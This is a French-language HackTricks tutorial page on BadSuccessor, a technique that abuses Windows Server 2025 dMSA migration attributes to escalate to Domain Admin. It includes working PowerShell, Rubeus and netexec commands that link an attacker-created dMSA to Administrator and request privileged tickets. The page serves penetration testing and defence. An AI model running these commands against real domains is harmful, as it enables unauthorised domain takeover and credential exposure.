# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

**BadSuccessor** abuse le workflow de migration **delegated Managed Service Account** (**dMSA**) introduit dans **Windows Server 2025**. Un dMSA peut être lié à un compte hérité via **`msDS-ManagedAccountPrecededByLink`** et déplacé à travers les états de migration stockés dans **`msDS-DelegatedMSAState`**. Si un attaquant peut créer un dMSA dans une OU inscriptible et contrôler ces attributs, le KDC peut émettre des tickets pour le dMSA contrôlé par l'attaquant avec le **contexte d'autorisation du compte lié**.

En pratique, cela signifie qu'un utilisateur à faible privilège qui n'a que des droits délégés sur une OU peut créer un nouveau dMSA, le pointer vers `Administrator`, terminer l'état de migration, puis obtenir un TGT dont le PAC contient des groupes privilégiés comme **Domain Admins**.

## Détails de migration dMSA qui comptent

- dMSA est une fonctionnalité de **Windows Server 2025**.
- `Start-ADServiceAccountMigration` met la migration dans l'état **started**.
- `Complete-ADServiceAccountMigration` met la migration dans l'état **completed**.
- `msDS-DelegatedMSAState = 1` signifie que la migration a commencé.
- `msDS-DelegatedMSAState = 2` signifie que la migration est terminée.
- Pendant une migration légitime, le dMSA est censé remplacer le compte supplanté de manière transparente, donc le KDC/LSA préservent l'accès que le compte précédent avait déjà.

Microsoft Learn indique également que pendant la migration, le compte d'origine est lié au dMSA et que le dMSA est censé accéder à tout ce que l'ancien compte pouvait accéder. C'est l'hypothèse de sécurité que BadSuccessor abuse.

## Exigences

1. Un domaine où **dMSA existe**, ce qui signifie qu'un support **Windows Server 2025** est présent côté AD.
2. L'attaquant peut **créer** des objets `msDS-DelegatedManagedServiceAccount` dans une certaine OU, ou dispose de droits équivalents de création d'objets enfants à cet endroit.
3. L'attaquant peut **écrire** les attributs dMSA pertinents ou contrôler entièrement le dMSA qu'il vient de créer.
4. L'attaquant peut demander des tickets Kerberos depuis un contexte joint au domaine ou via un tunnel qui atteint LDAP/Kerberos.

### Vérifications pratiques

Le signal opérateur le plus propre est de vérifier le niveau du domaine/forest et de confirmer que l'environnement utilise déjà la nouvelle pile Server 2025 :
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Si vous voyez des valeurs telles que `Windows2025Domain` et `Windows2025Forest`, traitez **BadSuccessor / dMSA migration abuse** comme une vérification prioritaire.

Vous pouvez également énumérer les OU inscriptibles déléguées pour la création de dMSA avec des outils publics :
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Flux d’abus

1. Créez un dMSA dans une OU où vous avez des droits delegated create-child.
2. Définissez **`msDS-ManagedAccountPrecededByLink`** sur le DN d’une cible privilégiée telle que `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Définissez **`msDS-DelegatedMSAState`** sur `2` pour marquer la migration comme terminée.
4. Demandez un TGT pour le nouveau dMSA et utilisez le ticket retourné pour accéder aux services privilégiés.

Exemple PowerShell :
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Exemples de requête de ticket / outils opérationnels :
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Pourquoi ceci est plus qu'une escalation de privilèges

Lors d'une migration légitime, Windows doit aussi permettre au nouveau dMSA de gérer les tickets qui ont été émis pour l'ancien compte avant la bascule. C'est pourquoi le matériel de ticket lié au dMSA peut inclure des clés **actuelles** et **précédentes** dans le flux **`KERB-DMSA-KEY-PACKAGE`**.

Pour une fausse migration contrôlée par un attaquant, ce comportement peut transformer BadSuccessor en :

- **escalation de privilèges** en héritant des SIDs de groupes privilégiés dans le PAC.
- **exposition de matériel d'identifiants** car la gestion de la clé précédente peut exposer un matériel équivalent au RC4/NT hash du prédécesseur dans des workflows vulnérables.

Cela rend la technique utile à la fois pour une prise de contrôle directe du domaine et pour des opérations de suivi telles que pass-the-hash ou une compromission plus large des identifiants.

## Notes sur l'état du patch

Le comportement original de BadSuccessor n'est **pas seulement un problème théorique de preview 2025**. Microsoft lui a attribué **CVE-2025-53779** et a publié une mise à jour de sécurité en **août 2025**. Conservez cette attaque documentée pour :

- **labs / CTFs / exercices assume-breach**
- **environnements Windows Server 2025 non patchés**
- **validation des délégations d'OU et de l'exposition dMSA lors des assessments**

N'assumez pas qu'un domaine Windows Server 2025 est vulnérable simplement parce que dMSA existe ; vérifiez le niveau de patch et testez avec soin.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
